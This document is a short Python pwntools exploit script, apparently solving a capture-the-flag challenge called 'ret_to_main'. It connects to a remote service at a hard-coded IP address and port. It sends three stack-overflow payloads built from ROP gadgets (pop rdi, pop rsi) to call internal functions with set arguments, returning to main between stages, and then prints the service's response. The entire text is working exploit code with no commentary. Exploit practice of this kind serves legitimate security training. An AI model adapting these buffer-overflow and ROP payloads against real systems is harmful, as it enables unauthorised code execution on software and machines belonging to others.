from pwn import *

BIN = './ret_to_main'
context.binary = BIN

# p = process(BIN)
p = remote("141.85.224.157", 31341)
elf = ELF(BIN)
rop = ROP(BIN)

stop = elf.symbols['stop']
right = elf.symbols['right']
there = elf.symbols['there']
main = elf.symbols['main']
offset = 0x30 + 8
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]

p.recvuntil(b'message: \n')
payload_open = offset * b'a' + p64(rdi) + p64(0x4ABADA55) + p64(stop) + p64(main)
p.sendline(payload_open)
p.recvline()

p.recvuntil(b'message: \n')
payload_read = offset * b'a' + p64(rdi) + p64(0xD15EA5ED) + p64(rsi) \
	+ p64(0x4B1DDE9) + p64(right) + p64(main)
p.sendline(payload_read)
p.recvline()

p.recvuntil(b'message: \n')
payload_read = offset * b'a' + p64(there)
p.sendline(payload_read)
print(p.recvline().decode().rstrip())
